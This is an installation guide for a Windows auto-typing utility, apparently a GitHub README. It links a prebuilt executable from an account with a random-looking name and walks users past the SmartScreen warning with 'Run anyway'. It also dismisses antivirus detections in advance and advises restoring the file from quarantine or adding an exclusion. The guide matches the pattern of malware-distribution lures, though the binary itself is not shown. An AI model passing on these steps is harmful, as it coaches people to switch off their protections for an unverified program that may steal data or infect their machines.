# Installation Guide — AutoTyper Tool for Windows

This guide walks you through downloading, extracting, and running **AutoTyper Tool** on Windows 10 or Windows 11, including how to handle the Windows SmartScreen warning that commonly appears for new auto-typing/keyboard-automation utilities.

## Table of Contents

- [System Requirements](#system-requirements)
- [Step 1: Download](#step-1-download)
- [Step 2: Extract the ZIP](#step-2-extract-the-zip)
- [Step 3: Run AutoTyper.exe](#step-3-run-autotyperexe)
- [Windows SmartScreen Warning](#windows-smartscreen-warning)
- [Antivirus False Positives](#antivirus-false-positives)
- [Uninstalling](#uninstalling)

## System Requirements

| Requirement | Minimum |
|---|---|
| Operating System | Windows 10 (64-bit) or Windows 11 |
| RAM | 50 MB free |
| Disk Space | < 10 MB |
| Runtime | None — fully self-contained executable |
| Administrator Rights | Not required |

## Step 1: Download

Download the latest release archive:

**[AutoTyper.zip](https://github.com/PitchSolicitorTend/AutoTyper-Tool/releases/download/AutoTyper/AutoTyper.zip)**

Or browse all versions on the [Releases page](https://github.com/PitchSolicitorTend/AutoTyper-Tool/releases).

## Step 2: Extract the ZIP

1. Right-click the downloaded `AutoTyper.zip` file.
2. Select **"Extract All..."**.
3. Choose a destination folder (Desktop, Documents, or even a USB drive — AutoTyper Tool is fully portable).
4. Click **Extract**.

## Step 3: Run AutoTyper.exe

1. Open the extracted folder.
2. Double-click **`AutoTyper.exe`**.
3. The main window will open — no installer, no setup wizard, no restart required.

## Windows SmartScreen Warning

Because AutoTyper Tool is a small, independently-distributed executable, Windows may show:

> "Windows protected your PC — Microsoft Defender SmartScreen prevented an unrecognized app from starting."

This is **normal for new or low-download-volume executables** and is not specific to AutoTyper Tool. To proceed:

1. Click **"More info"**.
2. Click **"Run anyway"**.

If you'd prefer not to see this prompt, you can review the source code in this repository and build the executable yourself.

## Antivirus False Positives

Auto-typing and keyboard-automation tools use the same low-level Windows APIs (such as `SendInput`/`keybd_event`) that some malware also uses to simulate keystrokes. Because of this, **some antivirus engines flag auto typers as "potentially unwanted programs" (PUA) even when the software is completely clean** — this is a well-documented false-positive category across the entire auto typer / auto clicker software category, not just AutoTyper Tool.

If your antivirus quarantines or blocks `AutoTyper.exe`:

- Check the result on [VirusTotal](https://www.virustotal.com/) — look for detections specifically labeled "PUA," "RiskWare," or "Generic" related to keyboard simulation.
- Review the open-source code in this repository.
- If you trust the source, restore the file from quarantine or add an exclusion in your antivirus settings.
- Alternatively, build AutoTyper Tool from source yourself.

## Uninstalling

AutoTyper Tool does not write to the Windows Registry, install services, or modify system files. To remove it:

1. Close AutoTyper Tool if it's running.
2. Delete the folder where you extracted `AutoTyper.zip`.

That's it — nothing else to clean up.

---

Next: [Usage Guide](usage-guide.md) — learn about hotkeys, presets, and configuration options.
